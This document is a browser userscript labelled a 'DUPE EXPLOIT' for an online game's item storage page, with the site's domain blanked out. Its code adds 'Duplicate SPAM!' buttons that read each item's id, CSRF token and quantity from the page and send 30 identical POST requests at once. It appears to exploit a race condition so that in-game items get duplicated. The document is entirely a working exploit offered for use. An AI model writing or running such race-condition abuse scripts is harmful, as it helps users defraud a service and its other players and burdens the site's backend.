# EXAMPLE1
// ==UserScript== 
// @name C....ea-......Games - DUPE EXPLOIT - By VarNate 
// @namespace VN 
// @version 1.0 
// @description -
// @author N- 
// @match https://------------/index.php?act=storage 
// @grant none 
// ==/UserScript== 
 /*globals jQuery, $, waitForKeyElements */

(function() { 'use strict';

var htmlBtn = '<button id="btnDuplicate" style="margin-right: 10px; background: red;" class="btn-u g-recaptcha"><i class="fa fa-gift"></i> Duplicate SPAM!</button>'

var iBtn = $('button i.fa-gift');
var btn = $('button i.fa-gift').parent();
var rect = btn.parent();
var tb = rect.parent().parent();
var inputsItemId = $('[name=item_id]', tb);
var inputsId = $('[name=id]', tb);
var inputsToken = $('[name=_token]', tb);
var inputsQuantity = $('[name=quantity]', tb);

rect.each(function(i,e) {

    console.log(i);
    console.log(e);
    var newBtn =  $(htmlBtn);
    $(e).append(newBtn);

    var selItemId = inputsItemId.eq(i);
    var selId = inputsId.eq(i);
    var selToken = inputsToken.eq(i);
    var selQuantity = inputsQuantity.eq(i);

    newBtn.click(function(e,o) {
        var itemId = selItemId.val();
        var id = selId.val();
        var token = selToken.val();
        var quantity = selQuantity.val();

        var charId = $('#character_sel').val();
        if (charId == null || charId === undefined || charId === '')
        {
            alert("select a character")
        }
        else
        {
            var url = 'https://--------------/index.php?act=storage';
            var data = { "item_id": itemId, "id": id, "char_id": charId, "_token": token, "quantity": quantity };

            for (i = 0; i < 30; i++)
            {
                $.post(url, data);
            }
            alert("After 10 sec Refresh the page")
        }


    });

});

// Your code here...
})();
